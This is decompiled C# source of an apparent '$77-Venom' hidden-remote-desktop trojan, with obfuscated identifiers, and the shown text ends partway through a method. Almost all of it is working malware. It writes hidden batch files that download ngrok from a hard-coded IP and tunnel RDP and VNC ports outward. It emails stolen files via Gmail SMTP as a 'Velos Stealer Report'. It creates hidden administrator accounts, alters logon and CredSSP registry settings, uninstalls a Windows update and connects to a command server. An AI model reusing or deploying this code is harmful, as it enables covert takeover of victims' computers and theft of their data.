// Decompiled with JetBrains decompiler
// Type: 㭨눨﹡븸�뮭紽꟒魦ꦯ훽�佼ᛡ⭝᧕냃ፗ
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan.MSIL.Zapchast.gen-defbae45ea8e71f8a50123f382f4538afc9db836de09bab316464d4793394f19.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.DirectoryServices;
using System.DirectoryServices.AccountManagement;
using System.IO;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

internal static class 㭨눨\uFE61븸\uFFFD뮭紽\uA7D2魦ꦯ훽\uF49E\uFFFD佼ᛡ\u2B5D\uF7B7᧕냃ፗ
{
  private static string \uF772钚嗪\u2BB5퉼鐡垤\u236A\uE908犛䤉쟨佲蛂ꆮᆺ쒟쾈\u3219하;
  public static bool 쉃曎鄖鯊ၺ雋먳鉢儲黗벟밿칤㖛ⱻ댴\u3385芢襝\uFFFD = true;
  private static string \u0004挤髮ペᡑ隥구\u20FC댾嚃뱀\u2B86\uF5A9몉彔\uE4D1㬾伻ᮨኗ = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\hrdpinst.exe";
  private static string[] \u302B\uFFFD\uE42A园\uF342\uEFBF䋶ⷹⱿ넦㻚텾\uFFFD撏䇧\u087E\uFFFD줬\uE596큔;

  [DllImport("kernel32.dll", EntryPoint = "Wow64DisableWow64FsRedirection", SetLastError = true)]
  public static extern bool 穒撔ᚑ甝\u2660奰툏稕뛞腣雝雬\u0891茯\uFFFD\uFFFD冽쁙\uEE5E졧(ref IntPtr ptr);

  [DllImport("kernel32.dll", EntryPoint = "Wow64RevertWow64FsRedirection", SetLastError = true)]
  public static extern bool \u2CE8ᱱ䧛渌㭜ዏ锟퇌与Ὺꧢ쪉䧇ﴑ傏톑ᾏ\u27BE㿨켓(IntPtr ptr);

  [DllImport("kernel32.dll", EntryPoint = "IsWow64Process", SetLastError = true)]
  public static extern bool 호魅뙨ㄿ䯀\u2B3A\u2B16Z蓏餇꽮霆䇂卖뜫㜅ꄥ젅닮ヸ(IntPtr hProcess, ref bool wow64Process);

  public static void 鞘\uE810\uE2A5\u0A45\uFFFD但궜ｇࠞ\u2009읧䠠쬧ቴ讳撡鄽練딃ȗ(string token)
  {
    try
    {
      StreamWriter streamWriter = new StreamWriter(Path.Combine(Path.GetTempPath(), "rdp.bat"));
      streamWriter.WriteLine("set downloadURL=http://91.134.207.16/ngrok.exe");
      streamWriter.WriteLine("set logFile=%TEMP%\\proclog.txt");
      streamWriter.WriteLine("set exeFile=%TEMP%\\ngrok.exe");
      streamWriter.WriteLine("set logFile=%TEMP%\\proclog.txt");
      streamWriter.WriteLine("powershell (new-object System.Net.WebClient).DownloadFile('http://91.134.207.16/ngrok.exe','%exeFile%');");
      streamWriter.WriteLine("%exeFile% authtoken " + token + " ");
      streamWriter.WriteLine("%exeFile%  tcp  3389 > %logFile%");
      streamWriter.Close();
      string str = Path.Combine(Path.GetTempPath(), "rdp.bat");
      Process.Start(new ProcessStartInfo()
      {
        FileName = str,
        CreateNoWindow = true,
        WindowStyle = ProcessWindowStyle.Hidden,
        UseShellExecute = true,
        ErrorDialog = false
      });
    }
    catch (Exception ex)
    {
    }
  }

  public static void 覨揅ሇ\u2FD1ᕔ磍à牅嘲\uF53E귢\uEFDB㼸宊\uF4C5\u27E1䥄꽂樢瘐(string token)
  {
    try
    {
      StreamWriter streamWriter = new StreamWriter(Path.Combine(Path.GetTempPath(), "vnc.bat"));
      streamWriter.WriteLine("set downloadURL=http://91.134.207.16/ngrok.exe");
      streamWriter.WriteLine("set logFile=%TEMP%\\proclog.txt");
      streamWriter.WriteLine("set exeFile=%TEMP%\\ngrok.exe");
      streamWriter.WriteLine("set logFile=%TEMP%\\proclog.txt");
      streamWriter.WriteLine("powershell (new-object System.Net.WebClient).DownloadFile('http://91.134.207.16/ngrok.exe','%exeFile%');");
      streamWriter.WriteLine("%exeFile% authtoken " + token + " ");
      streamWriter.WriteLine("%exeFile%  tcp  5900 > %logFile%");
      streamWriter.Close();
      string str = Path.Combine(Path.GetTempPath(), "vnc.bat");
      Process.Start(new ProcessStartInfo()
      {
        FileName = str,
        CreateNoWindow = true,
        WindowStyle = ProcessWindowStyle.Hidden,
        UseShellExecute = true,
        ErrorDialog = false
      });
    }
    catch (Exception ex)
    {
    }
  }

  public static void 顕뺓\uFFFD笖瞉阘ﻊ\uF488칎Ỏﮍ꼛髿絟Ꙃ\u0CB4\uFFFD䃀\uE0CBỔ(
    string filepath,
    string email,
    string toemail,
    string password)
  {
    try
    {
      Process.Start(new ProcessStartInfo()
      {
        FileName = "cmd",
        Arguments = "/k start /b powershell –ExecutionPolicy Bypass -WindowStyle Hidden Set-ExecutionPolicy Unrestricted & exit",
        CreateNoWindow = true,
        WindowStyle = ProcessWindowStyle.Hidden,
        UseShellExecute = true,
        ErrorDialog = false
      });
      StreamWriter streamWriter = new StreamWriter(Path.Combine(Path.GetTempPath(), "email.bat"));
      streamWriter.WriteLine("@ECHO OFF");
      streamWriter.WriteLine("SET GmailAccount=" + email);
      streamWriter.WriteLine("SET GmailPassword=" + password);
      streamWriter.WriteLine("SET Attachment=" + filepath);
      streamWriter.WriteLine("CALL :PowerShell");
      streamWriter.WriteLine("CD /D %PowerShellDir%");
      streamWriter.WriteLine("Powershell -ExecutionPolicy Bypass -Command & '%PSScript%' '%GmailAccount%' '%GmailPassword%' '%Attachment%'");
      streamWriter.WriteLine("IF EXIST %~FN0 DEL /Q /F %~FN0");
      streamWriter.WriteLine("EXIT");
      streamWriter.WriteLine(":PowerShell");
      streamWriter.WriteLine("SET PowerShellDir=C:\\Windows\\System32\\WindowsPowerShell\\v1.0");
      streamWriter.WriteLine("SET PSScript=%temp%\\~tmpSendeMail.ps1");
      streamWriter.WriteLine("IF EXIST %PSScript% DEL /Q /F %PSScript%");
      streamWriter.WriteLine("ECHO $Username      = $args[0]>> %PSScript%");
      streamWriter.WriteLine("ECHO $EmailPassword = $args[1]>> %PSScript%");
      streamWriter.WriteLine("ECHO $Attachment    = $args[2]>> %PSScript%");
      streamWriter.WriteLine("ECHO >> %PSScript%");
      streamWriter.WriteLine("ECHO $Username    = $Username >> %PSScript%");
      streamWriter.WriteLine("ECHO $EmailTo     = " + toemail + " >> %PSScript%");
      streamWriter.WriteLine("ECHO $EmailFrom   = " + email + " >> %PSScript%");
      streamWriter.WriteLine("ECHO $Subject     = Velos Stealer Report >> %PSScript%");
      streamWriter.WriteLine("ECHO $Body        = Velos download >> %PSScript%");
      streamWriter.WriteLine("ECHO $SMTPServer  = smtp.gmail.com >> %PSScript%");
      streamWriter.WriteLine("ECHO $SMTPMessage = New-Object System.Net.Mail.MailMessage($EmailFrom, $EmailTo, $Subject, $Body) >> %PSScript%");
      streamWriter.WriteLine("ECHO $Attachment  = New-Object System.Net.Mail.Attachment($Attachment) >> %PSScript%");
      streamWriter.WriteLine("ECHO $SMTPMessage.Attachments.Add($Attachment) >> %PSScript%");
      streamWriter.WriteLine("ECHO $SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587) >> %PSScript%");
      streamWriter.WriteLine("ECHO $SMTPClient.EnableSsl = $true >> %PSScript%");
      streamWriter.WriteLine("ECHO $SMTPClient.Credentials = New-Object System.Net.NetworkCredential($Username, $EmailPassword) >> %PSScript%");
      streamWriter.WriteLine("ECHO $SMTPClient.Send($SMTPMessage) >> %PSScript%");
      streamWriter.WriteLine("GOTO :EOF");
      string str = Path.Combine(Path.GetTempPath(), "email.bat");
      Process.Start(new ProcessStartInfo()
      {
        FileName = str,
        CreateNoWindow = true,
        WindowStyle = ProcessWindowStyle.Hidden,
        UseShellExecute = true,
        ErrorDialog = false
      });
    }
    catch (Exception ex)
    {
    }
  }

  private static void ਪ茗㻓ㄣ䁵Ӕ銟왢ᆡ詙ｎᾚ瞹爧䌳녶糇\uE368\uFFFD\u0D5A()
  {
    try
    {
      TcpClient client = new TcpClient(㭨눨\uFE61븸\uFFFD뮭紽\uA7D2魦ꦯ훽\uF49E\uFFFD佼ᛡ\u2B5D\uF7B7᧕냃ፗ.\u302B\uFFFD\uE42A园\uF342\uEFBF䋶ⷹⱿ넦㻚텾\uFFFD撏䇧\u087E\uFFFD줬\uE596큔[0], Convert.ToInt32(㭨눨\uFE61븸\uFFFD뮭紽\uA7D2魦ꦯ훽\uF49E\uFFFD佼ᛡ\u2B5D\uF7B7᧕냃ፗ.\u302B\uFFFD\uE42A园\uF342\uEFBF䋶ⷹⱿ넦㻚텾\uFFFD撏䇧\u087E\uFFFD줬\uE596큔[1]));
      NetworkStream stream = client.GetStream();
      byte[] bytes = Encoding.ASCII.GetBytes("HRDP-SOC:\r\n\r\n");
      stream.Write(bytes, 0, bytes.Length);
      stream.Flush();
      ﱿㄵల\uE38C툵\u2FFB\uF5B4\u24DE썐〲蹴\uEF17\u2A67ﶚ㼂ᛂ둤\uF869涻쏄.䊓璜뇳퀏뚵䜷獏汹雧娂勨෮\uE2CB鶪䒓䨁䨳椇\uE41F폔(client, new 㭨눨\uFE61븸\uFFFD뮭紽\uA7D2魦ꦯ훽\uF49E\uFFFD佼ᛡ\u2B5D\uF7B7᧕냃ፗ.\uE2ABኸ绗\uF885\uEFFAꊻ奺\uF46F\u2086祘ᗄἥ鏱䫇뱰돪\uE476ℍ䝉\uE341(㭨눨\uFE61븸\uFFFD뮭紽\uA7D2魦ꦯ훽\uF49E\uFFFD佼ᛡ\u2B5D\uF7B7᧕냃ፗ.ਪ茗㻓ㄣ䁵Ӕ銟왢ᆡ詙ｎᾚ瞹爧䌳녶糇\uE368\uFFFD\u0D5A));
    }
    catch (Exception ex)
    {
      㭨눨\uFE61븸\uFFFD뮭紽\uA7D2魦ꦯ훽\uF49E\uFFFD佼ᛡ\u2B5D\uF7B7᧕냃ፗ.艗\u2BF9蘓紸\uE899\uEB20鯜ᦑ殃뻍囘\uE3B3邝過\uF87A蟊ѯ㫰ᾫ腆();
    }
  }

  public static void 艗\u2BF9蘓紸\uE899\uEB20鯜ᦑ殃뻍囘\uE3B3邝過\uF87A蟊ѯ㫰ᾫ腆()
  {
    㭨눨\uFE61븸\uFFFD뮭紽\uA7D2魦ꦯ훽\uF49E\uFFFD佼ᛡ\u2B5D\uF7B7᧕냃ፗ.쉃曎鄖鯊ၺ雋먳鉢儲黗벟밿칤㖛ⱻ댴\u3385芢襝\uFFFD = false;
    㭨눨\uFE61븸\uFFFD뮭紽\uA7D2魦ꦯ훽\uF49E\uFFFD佼ᛡ\u2B5D\uF7B7᧕냃ፗ.\uE498㦱ꐛ\uF52A䕆朰乗ꌅ䞊줁贳\uE92E昢㸔쬺㝡\uF3F7쾨릷匿();
    㭨눨\uFE61븸\uFFFD뮭紽\uA7D2魦ꦯ훽\uF49E\uFFFD佼ᛡ\u2B5D\uF7B7᧕냃ፗ.媐좄芾朡Ⳅ\uFFFD뗣绝埳啃긬騶\uFFFD\uF5A7有퇋踍ᇩꄈꙛ(㭨눨\uFE61븸\uFFFD뮭紽\uA7D2魦ꦯ훽\uF49E\uFFFD佼ᛡ\u2B5D\uF7B7᧕냃ፗ.\uF772钚嗪\u2BB5퉼鐡垤\u236A\uE908犛䤉쟨佲蛂ꆮᆺ쒟쾈\u3219하);
    㭨눨\uFE61븸\uFFFD뮭紽\uA7D2魦ꦯ훽\uF49E\uFFFD佼ᛡ\u2B5D\uF7B7᧕냃ፗ.\uFFFD\uE0AA琲앍\uEEF7쌔뷷虴し煕辉\u25D8韁埅\uA8DD쉺憘샶萛叮(㭨눨\uFE61븸\uFFFD뮭紽\uA7D2魦ꦯ훽\uF49E\uFFFD佼ᛡ\u2B5D\uF7B7᧕냃ፗ.\uF772钚嗪\u2BB5퉼鐡垤\u236A\uE908犛䤉쟨佲蛂ꆮᆺ쒟쾈\u3219하);
    㭨눨\uFE61븸\uFFFD뮭紽\uA7D2魦ꦯ훽\uF49E\uFFFD佼ᛡ\u2B5D\uF7B7᧕냃ፗ.娧切藹㷺㠍厴ꉌ\u4DFF첻펜ꭐ\uFFFD곾톽鼹\u1AD6垺嗪㢲嫊(㭨눨\uFE61븸\uFFFD뮭紽\uA7D2魦ꦯ훽\uF49E\uFFFD佼ᛡ\u2B5D\uF7B7᧕냃ፗ.\uF772钚嗪\u2BB5퉼鐡垤\u236A\uE908犛䤉쟨佲蛂ꆮᆺ쒟쾈\u3219하);
    Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
    Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true).SetValue("dontdisplaylastusername", (object) 0);
    Application.Exit();
  }

  public static void 娧切藹㷺㠍厴ꉌ\u4DFF첻펜ꭐ\uFFFD곾톽鼹\u1AD6垺嗪㢲嫊(string username)
  {
    try
    {
      DirectoryEntry directoryEntry = new DirectoryEntry("WinNT://" + Environment.MachineName + ",computer");
      DirectoryEntry entry = directoryEntry.Children.Find(username, "user");
      directoryEntry.Children.Remove(entry);
      entry.Close();
      directoryEntry.Close();
    }
    catch (Exception ex)
    {
      throw ex;
    }
  }

  public static void \uFFFD\uE0AA琲앍\uEEF7쌔뷷虴し煕辉\u25D8韁埅\uA8DD쉺憘샶萛叮(string username)
  {
    IntPtr zero = IntPtr.Zero;
    if (㭨눨\uFE61븸\uFFFD뮭紽\uA7D2魦ꦯ훽\uF49E\uFFFD佼ᛡ\u2B5D\uF7B7᧕냃ፗ.뮆迭埗\uEC0B\uF361輂\uF8C6喝Ⲽ\uEF9B펖弑伉升틈犯္慒叼税())
      㭨눨\uFE61븸\uFFFD뮭紽\uA7D2魦ꦯ훽\uF49E\uFFFD佼ᛡ\u2B5D\uF7B7᧕냃ፗ.穒撔ᚑ甝\u2660奰툏稕뛞腣雝雬\u0891茯\uFFFD\uFFFD冽쁙\uEE5E졧(ref zero);
    ProcessStartInfo processStartInfo1 = new ProcessStartInfo("C:\\Windows\\System32\\query.exe", "user " + username);
    processStartInfo1.CreateNoWindow = true;
    processStartInfo1.RedirectStandardOutput = true;
    processStartInfo1.RedirectStandardError = true;
    processStartInfo1.UseShellExecute = false;
    Process process1 = new Process();
    process1.StartInfo = processStartInfo1;
    process1.Start();
    string end = process1.StandardOutput.ReadToEnd();
    process1.WaitForExit();
    if (end != "")
    {
      try
      {
        string str1 = end.Split(new string[1]{ "\r\n" }, StringSplitOptions.None)[1].Trim();
        Console.WriteLine(str1);
        string str2 = str1.Substring(str1.IndexOf(" ")).Trim();
        string arguments = str2.Substring(0, str2.IndexOf(" "));
        Console.WriteLine(arguments);
        ProcessStartInfo processStartInfo2 = new ProcessStartInfo("C:\\Windows\\System32\\logoff.exe", arguments);
        processStartInfo2.CreateNoWindow = true;
        processStartInfo2.RedirectStandardOutput = true;
        processStartInfo2.RedirectStandardError = true;
        processStartInfo2.UseShellExecute = false;
        Process process2 = new Process();
        process2.StartInfo = processStartInfo2;
        process2.Start();
        process2.StandardOutput.ReadToEnd();
        process2.WaitForExit();
      }
      catch (Exception ex)
      {
      }
    }
    if (!㭨눨\uFE61븸\uFFFD뮭紽\uA7D2魦ꦯ훽\uF49E\uFFFD佼ᛡ\u2B5D\uF7B7᧕냃ፗ.뮆迭埗\uEC0B\uF361輂\uF8C6喝Ⲽ\uEF9B펖弑伉升틈犯္慒叼税())
      return;
    㭨눨\uFE61븸\uFFFD뮭紽\uA7D2魦ꦯ훽\uF49E\uFFFD佼ᛡ\u2B5D\uF7B7᧕냃ፗ.\u2CE8ᱱ䧛渌㭜ዏ锟퇌与Ὺꧢ쪉䧇ﴑ傏톑ᾏ\u27BE㿨켓(zero);
  }

  public static bool 뮆迭埗\uEC0B\uF361輂\uF8C6喝Ⲽ\uEF9B펖弑伉升틈犯္慒叼税()
  {
    if ((Environment.OSVersion.Version.Major != 5 || Environment.OSVersion.Version.Minor < 1) && Environment.OSVersion.Version.Major < 6)
      return false;
    using (Process currentProcess = Process.GetCurrentProcess())
    {
      bool wow64Process = false;
      return 㭨눨\uFE61븸\uFFFD뮭紽\uA7D2魦ꦯ훽\uF49E\uFFFD佼ᛡ\u2B5D\uF7B7᧕냃ፗ.호魅뙨ㄿ䯀\u2B3A\u2B16Z蓏餇꽮霆䇂卖뜫㜅ꄥ젅닮ヸ(currentProcess.Handle, ref wow64Process) && wow64Process;
    }
  }

  public static bool 嬅橀罄錠ࢳ辢졒祏惮뵌옴쐜\u232B鮮\uFFFD\u0EE1蚦쬈䧇ﬡ()
  {
    ProcessStartInfo processStartInfo = new ProcessStartInfo(㭨눨\uFE61븸\uFFFD뮭紽\uA7D2魦ꦯ훽\uF49E\uFFFD佼ᛡ\u2B5D\uF7B7᧕냃ፗ.\u0004挤髮ペᡑ隥구\u20FC댾嚃뱀\u2B86\uF5A9몉彔\uE4D1㬾伻ᮨኗ, "-i -o");
    processStartInfo.CreateNoWindow = true;
    processStartInfo.RedirectStandardOutput = true;
    processStartInfo.RedirectStandardError = true;
    processStartInfo.UseShellExecute = false;
    Process process = new Process();
    process.StartInfo = processStartInfo;
    process.Start();
    string end = process.StandardOutput.ReadToEnd();
    process.WaitForExit();
    return end != "" && !end.ToLower().Contains("terminal services is not supported.") && end.ToLower().Contains("terminal services is fully supported.");
  }

  public static bool \uE498㦱ꐛ\uF52A䕆朰乗ꌅ䞊줁贳\uE92E昢㸔쬺㝡\uF3F7쾨릷匿()
  {
    ProcessStartInfo processStartInfo = new ProcessStartInfo(㭨눨\uFE61븸\uFFFD뮭紽\uA7D2魦ꦯ훽\uF49E\uFFFD佼ᛡ\u2B5D\uF7B7᧕냃ፗ.\u0004挤髮ペᡑ隥구\u20FC댾嚃뱀\u2B86\uF5A9몉彔\uE4D1㬾伻ᮨኗ, "-u");
    processStartInfo.CreateNoWindow = true;
    processStartInfo.RedirectStandardOutput = true;
    processStartInfo.RedirectStandardError = true;
    processStartInfo.UseShellExecute = false;
    Process process = new Process();
    process.StartInfo = processStartInfo;
    process.Start();
    string end = process.StandardOutput.ReadToEnd();
    process.WaitForExit();
    return end == null;
  }

  public static bool 媐좄芾朡Ⳅ\uFFFD뗣绝埳啃긬騶\uFFFD\uF5A7有퇋踍ᇩꄈꙛ(string name)
  {
    ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c net user " + name + " /delete");
    processStartInfo.CreateNoWindow = true;
    processStartInfo.RedirectStandardOutput = true;
    processStartInfo.RedirectStandardError = true;
    processStartInfo.UseShellExecute = false;
    Process process = new Process();
    process.StartInfo = processStartInfo;
    process.Start();
    string end = process.StandardOutput.ReadToEnd();
    process.WaitForExit();
    return end != "" && end.ToLower().Contains("command completed successfully.");
  }

  public static bool 쎺\u2A44䞙낏澕䞔\u00BBꁥ慇吝ჴ烞偽\u0CFC챤葭\uF3A4\uF057鴣䄮(string name)
  {
    ProcessStartInfo processStartInfo1 = new ProcessStartInfo("cmd.exe", "/c net user " + name + " " + name + " /add");
    processStartInfo1.CreateNoWindow = true;
    processStartInfo1.RedirectStandardOutput = true;
    processStartInfo1.RedirectStandardError = true;
    processStartInfo1.UseShellExecute = false;
    Process process1 = new Process();
    process1.StartInfo = processStartInfo1;
    process1.Start();
    string end1 = process1.StandardOutput.ReadToEnd();
    process1.WaitForExit();
    if (!(end1 != "") || !end1.ToLower().Contains("command completed successfully."))
      return false;
    ProcessStartInfo processStartInfo2 = new ProcessStartInfo("cmd.exe", "/c net localgroup administrators " + name + " /add");
    processStartInfo2.CreateNoWindow = true;
    processStartInfo2.RedirectStandardOutput = true;
    processStartInfo2.RedirectStandardError = true;
    processStartInfo2.UseShellExecute = false;
    Process process2 = new Process();
    process2.StartInfo = processStartInfo2;
    process2.Start();
    string end2 = process2.StandardOutput.ReadToEnd();
    process2.WaitForExit();
    return end2 != "" && end2.ToLower().Contains("command completed successfully.");
  }

  public static string ᶊ漽폢췩馔妷ᄽኀ斃\uE9E9큤깝㽈ৌ李䅘랍祰嶘뢅()
  {
    string str = "abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNOPQRSTUVWXYZ";
    StringBuilder stringBuilder = new StringBuilder();
    Random random = new Random();
    for (int index1 = 1; index1 <= 10; ++index1)
    {
      int index2 = random.Next(0, str.Length);
      char ch = str[index2];
      stringBuilder.Append(ch);
    }
    return stringBuilder.ToString();
  }

  public static void 払民朧Ꮴ诎쑓\uE2DA㦝\u260B쇼\u0FF6ᝍꍃ鑹\uF454雱賤\u1A8F\uF085嫛(string user)
  {
    switch (Environment.OSVersion.Version.Major)
    {
      case 5:
        RegistryKey registryKey1 = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
        if (registryKey1 == null)
        {
          Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", RegistryKeyPermissionCheck.ReadWriteSubTree);
          registryKey1 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
          registryKey1.SetValue("dontdisplaylastusername", (object) 1);
        }
        else
          registryKey1.SetValue("dontdisplaylastusername", (object) 1);
        registryKey1.Flush();
        if (Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", true) == null)
        {
          Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", RegistryKeyPermissionCheck.ReadWriteSubTree);
          Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", true).SetValue("DWORD", (object) 2);
        }
        else
          registryKey1.SetValue("DWORD", (object) 2);
        registryKey1.Flush();
        string identityValue1 = "Venom";
        string newPassword1 = "Venom";
        PrincipalContext context1;
        try
        {
          Console.WriteLine("Building System Information");
          context1 = new PrincipalContext(ContextType.Machine, (string) null);
        }
        catch (Exception ex)
        {
          Console.WriteLine("Failed to create System Context.");
          Console.WriteLine("Exception: " + ex?.ToString());
          Console.WriteLine();
          Console.WriteLine("Press Any Key to Continue");
          Console.ReadLine();
          break;
        }
        Console.WriteLine("Checking if User Exists.");
        if (UserPrincipal.FindByIdentity(context1, identityValue1) != null)
        {
          Console.WriteLine(identityValue1 + " already exists. Exiting!!");
          Console.ReadLine();
          break;
        }
        Console.WriteLine("Building User Information");
        UserPrincipal user1 = new UserPrincipal(context1);
        user1.Name = identityValue1;
        user1.DisplayName = "Venom Administrative User";
        user1.PasswordNeverExpires = true;
        user1.SetPassword(newPassword1);
        user1.Enabled = new bool?(true);
        try
        {
          Console.WriteLine("Creating New User");
          user1.Save();
        }
        catch (Exception ex)
        {
          Console.WriteLine("Failed to create user.");
          Console.WriteLine("Exception: " + ex?.ToString());
          Console.WriteLine();
          Console.WriteLine("Press Any Key to Continue");
          Console.ReadLine();
          break;
        }
        GroupPrincipal groupPrincipal1 = (GroupPrincipal) null;
        try
        {
          groupPrincipal1 = GroupPrincipal.FindByIdentity(context1, "Administrators");
          if (groupPrincipal1 != null)
          {
            Console.WriteLine("Checking if itadmin is part of Administrators Group");
            if (groupPrincipal1.Members.Contains(context1, IdentityType.SamAccountName, identityValue1))
            {
              Console.WriteLine("Administrators already contains " + identityValue1);
              break;
            }
            Console.WriteLine("Adding itadmin to Administrators Group");
            groupPrincipal1.Members.Add(user1);
            groupPrincipal1.Save();
            break;
          }
          Console.WriteLine("Could not find the group Administrators");
        }
        catch (Exception ex)
        {
          Console.WriteLine("Exception adding user to group.");
          Console.WriteLine("Exception: " + ex?.ToString());
          Console.WriteLine();
          Console.WriteLine("Press Any Key to Continue");
          Console.ReadLine();
        }
        Console.WriteLine("Cleaning Up");
        groupPrincipal1.Dispose();
        user1.Dispose();
        context1.Dispose();
        Console.WriteLine();
        Console.WriteLine("Press Any Key to Continue");
        Console.ReadLine();
        break;
      case 6:
        RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
        if (registryKey2 == null)
        {
          Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", RegistryKeyPermissionCheck.ReadWriteSubTree);
          registryKey2 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
          registryKey2.SetValue("dontdisplaylastusername", (object) 1);
        }
        else
          registryKey2.SetValue("dontdisplaylastusername", (object) 1);
        registryKey2.Flush();
        if (Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", true) == null)
        {
          Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", RegistryKeyPermissionCheck.ReadWriteSubTree);
          Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", true).SetValue("DWORD", (object) 2);
        }
        else
          registryKey2.SetValue("DWORD", (object) 2);
        registryKey2.Flush();
        string identityValue2 = user;
        string newPassword2 = user;
        PrincipalContext context2;
        try
        {
          Console.WriteLine("Building System Information");
          context2 = new PrincipalContext(ContextType.Machine, (string) null);
        }
        catch (Exception ex)
        {
          Console.WriteLine("Failed to create System Context.");
          Console.WriteLine("Exception: " + ex?.ToString());
          Console.WriteLine();
          Console.WriteLine("Press Any Key to Continue");
          Console.ReadLine();
          break;
        }
        Console.WriteLine("Checking if User Exists.");
        if (UserPrincipal.FindByIdentity(context2, identityValue2) != null)
        {
          Console.WriteLine(identityValue2 + " already exists. Exiting!!");
          Console.ReadLine();
          break;
        }
        Console.WriteLine("Building User Information");
        UserPrincipal user2 = new UserPrincipal(context2);
        user2.Name = identityValue2;
        user2.DisplayName = "Venom Administrative User";
        user2.PasswordNeverExpires = true;
        user2.SetPassword(newPassword2);
        user2.Enabled = new bool?(true);
        try
        {
          Console.WriteLine("Creating New User");
          user2.Save();
        }
        catch (Exception ex)
        {
          Console.WriteLine("Failed to create user.");
          Console.WriteLine("Exception: " + ex?.ToString());
          Console.WriteLine();
          Console.WriteLine("Press Any Key to Continue");
          Console.ReadLine();
          break;
        }
        GroupPrincipal groupPrincipal2 = (GroupPrincipal) null;
        try
        {
          groupPrincipal2 = GroupPrincipal.FindByIdentity(context2, "Administrators");
          if (groupPrincipal2 != null)
          {
            Console.WriteLine("Checking if itadmin is part of Administrators Group");
            if (groupPrincipal2.Members.Contains(context2, IdentityType.SamAccountName, identityValue2))
            {
              Console.WriteLine("Administrators already contains " + identityValue2);
              break;
            }
            Console.WriteLine("Adding itadmin to Administrators Group");
            groupPrincipal2.Members.Add(user2);
            groupPrincipal2.Save();
            break;
          }
          Console.WriteLine("Could not find the group Administrators");
        }
        catch (Exception ex)
        {
          Console.WriteLine("Exception adding user to group.");
          Console.WriteLine("Exception: " + ex?.ToString());
          Console.WriteLine();
          Console.WriteLine("Press Any Key to Continue");
          Console.ReadLine();
        }
        Console.WriteLine("Cleaning Up");
        groupPrincipal2.Dispose();
        user2.Dispose();
        context2.Dispose();
        Console.WriteLine();
        Console.WriteLine("Press Any Key to Continue");
        Console.ReadLine();
        break;
      case 10:
        Process.Start(new ProcessStartInfo()
        {
          FileName = "cmd",
          Arguments = "/k start /b wusa /uninstall /kb:4471332 /quiet & exit",
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden,
          UseShellExecute = true,
          ErrorDialog = false
        });
        RegistryKey registryKey3 = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
        if (registryKey3 == null)
        {
          Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", RegistryKeyPermissionCheck.ReadWriteSubTree);
          registryKey3 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
          registryKey3.SetValue("dontdisplaylastusername", (object) 1);
        }
        else
          registryKey3.SetValue("dontdisplaylastusername", (object) 1);
        registryKey3.Flush();
        if (Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", true) == null)
        {
          Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", RegistryKeyPermissionCheck.ReadWriteSubTree);
          Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", true).SetValue("DWORD", (object) 2);
        }
        else
          registryKey3.SetValue("DWORD", (object) 2);
        registryKey3.Flush();
        string identityValue3 = "Venom";
        string newPassword3 = "Venom";
        PrincipalContext context3;
        try
        {
          Console.WriteLine("Building System Information");
          context3 = new PrincipalContext(ContextType.Machine, (string) null);
        }
        catch (Exception ex)
        {
          Console.WriteLine("Failed to create System Context.");
          Console.WriteLine("Exception: " + ex?.ToString());
          Console.WriteLine();
          Console.WriteLine("Press Any Key to Continue");
          Console.ReadLine();
          break;
        }
        Console.WriteLine("Checking if User Exists.");
        if (UserPrincipal.FindByIdentity(context3, identityValue3) != null)
        {
          Console.WriteLine(identityValue3 + " already exists. Exiting!!");
          Console.ReadLine();
          break;
        }
        Console.WriteLine("Building User Information");
        UserPrincipal user3 = new UserPrincipal(context3);
        user3.Name = identityValue3;
        user3.DisplayName = "Venom Administrative User";
        user3.PasswordNeverExpires = true;
